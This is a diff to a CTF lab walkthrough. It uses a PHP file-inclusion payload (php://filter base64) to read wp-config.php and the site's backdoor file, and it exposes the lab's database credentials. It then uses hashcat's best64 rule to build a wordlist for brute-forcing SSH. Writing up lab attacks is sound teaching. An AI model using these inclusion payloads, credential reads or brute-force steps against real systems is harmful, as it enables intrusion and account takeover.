@@ -47,7 +47,7 @@ Modify it for ourselves:<br>
 http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=wp-config.php
 ```
 And it will give us a base64 string which we can decode and get the original wp-config.php code.<br>
-Here is an interesting string:<br>
+Here is an interesting piece of code:<br>
 ```
 ...
 /** MySQL database username */
@@ -57,6 +57,19 @@ define( 'DB_USER', 'john' );
 define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
 ...
 ```
+We know that there is the open ssh port. If we try to use these credentials to ssh it does not work.<br>
+Also, we know that there is the backdoor file. Let's download it and look what it looks like.<br>
+`http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php`<br>
+Got a piece of code with another base64 line which says:<br>
+`That password alone won't help you! Hashcat says rules are rules`<br>
+And this is kind of hint.<br>
+We know that `hashcat` is a tool for password bruteforcing. We can see the work "rules" in the text which brings an assumption that we need to use a rule. _That is where we need get acquainted with password cracking rules._ Also, we can make an assumption that the rules is best64, since our hint was encoded in base64.<br>
+We are going to take the password that we found in `wp-config.php`, put it in fule `pwd.txt` and generate a custom wordlist with `hashcat` and rule called `best64`.<br>
+Our command will look like this:<br>
+```
+hashcat pwd.txt -r /usr/share/hashcat/rules/best64.rule --stdout > custom_wordlist.txt
+```
+Now, we have got our custom wordlist. Let's try to bruteforce into `ssh`.
 
 
 
